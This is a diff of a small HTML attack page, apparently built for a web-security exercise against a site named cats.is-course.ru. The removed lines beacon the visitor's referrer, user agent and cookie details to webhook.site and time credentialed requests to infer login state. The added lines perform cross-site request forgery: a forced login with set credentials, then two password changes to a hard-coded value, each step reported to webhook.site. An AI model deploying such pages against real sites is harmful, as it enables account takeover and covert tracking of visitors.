@@ -1,21 +1,22 @@
-<!doctype html><html><head><meta charset="utf-8"></head><body><h1>pics</h1>
+<!doctype html><html><head><meta charset="utf-8"></head><body><h1>site</h1>
 <script>
-var U="5169748c-49df-4307-9820-7383309d9f02";
+var U="5169748c-49df-4307-9820-7383309d9f02", B="https://cats.is-course.ru", NP="Cook9!flowtest2026";
 function beep(n){(new Image()).src="https://webhook.site/"+U+"/"+n;}
-beep("ref_"+encodeURIComponent(document.referrer||"none").slice(0,80));
-beep("ua_"+encodeURIComponent((navigator.userAgent||"").slice(0,60)));
-beep("ck_"+navigator.cookieEnabled+"_"+document.cookie.length);
-beep("vis_"+(document.visibilityState||"?")+"_"+(window.top===window));
-function t(url){return new Promise(function(res){var a=performance.now();
-  fetch(url,{mode:"no-cors",credentials:"include",cache:"no-store"}).then(function(){res(performance.now()-a);}).catch(function(){res(-1);});});}
+function post(url,body){
+  return fetch(B+url,{method:"POST",mode:"no-cors",credentials:"include",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},body:body});
+}
 (async function(){
-  var S=[],L=[],N=[];
-  for(var i=0;i<20;i++){
-    S.push(await t("https://cats.is-course.ru/settings"));
-    L.push(await t("https://cats.is-course.ru/login"));
-    N.push(await t("https://cats.is-course.ru/nope-xyz"));
-  }
-  function med(a){a=a.filter(x=>x>0).sort((x,y)=>x-y);return a.length?a[Math.floor(a.length/2)]:-1;}
-  beep("med_S"+med(S)+"_L"+med(L)+"_N"+med(N));
+  try{
+    await post("/login","login=somenewuser&password=Qq1%21zzzzzzzzzz");
+    beep("p1_login");
+    await new Promise(r=>setTimeout(r,400));
+    await post("/settings","password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP));
+    beep("p2_set");
+    await new Promise(r=>setTimeout(r,400));
+    await post("/settings","password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP));
+    beep("p3_setagain");
+  }catch(e){beep("err");}
+  beep("done");
 })();
 </script></body></html>
